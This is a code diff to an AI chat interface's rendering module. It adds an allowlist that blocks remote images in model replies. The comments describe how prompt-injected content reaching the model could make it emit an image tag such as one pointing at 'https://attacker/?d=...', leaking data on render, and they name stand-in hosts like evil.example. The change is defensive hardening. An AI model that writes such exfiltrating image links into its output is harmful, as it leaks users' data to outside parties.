@@ -97,7 +97,45 @@
     return fragment;
   }
 
+  // Remote images in a reply are an OUTBOUND channel, not a feature.
+  // A rendered <img src="https://attacker/?d=..."> fires that request on render,
+  // with no click and no user interaction -- and this module's whole premise is
+  // that model output is partially influenceable through recall hits and any web
+  // content that reaches the context. The only image source this feature
+  // actually needs is the Hub's own content-addressed store, so anything else is
+  // replaced with an inert placeholder rather than fetched.
+  const ALLOWED_IMG_PREFIX = '/api/chat/attachments/';
+
+  function imageSrcIsAllowed(src) {
+    const base = (global.location && global.location.href) || 'http://localhost/';
+    let url;
+    try {
+      // Resolved against the page origin, so "//evil.example/x" and
+      // "https://evil.example/api/chat/attachments/x" both fail: the first
+      // resolves to a foreign origin, the second already is one.
+      url = new URL(String(src || ''), base);
+    } catch (err) {
+      return false;
+    }
+    if (global.location && url.origin !== global.location.origin) return false;
+    return url.pathname.startsWith(ALLOWED_IMG_PREFIX);
+  }
+
+  function neutralizeRemoteImages(root) {
+    root.querySelectorAll('img').forEach((img) => {
+      if (imageSrcIsAllowed(img.getAttribute('src'))) return;
+      const placeholder = document.createElement('span');
+      placeholder.className = 'om-img-blocked';
+      placeholder.textContent = img.getAttribute('alt')
+        ? `[image: ${img.getAttribute('alt')}]`
+        : '[external image blocked]';
+      placeholder.title = 'External images are not loaded from chat replies';
+      img.replaceWith(placeholder);
+    });
+  }
+
   function decorateLinks(root) {
+    neutralizeRemoteImages(root);
     root.querySelectorAll('a[href]').forEach((anchor) => {
       // A reply can contain a link Orion read somewhere. Opening it must not
       // hand the opener a handle back to the Hub window.
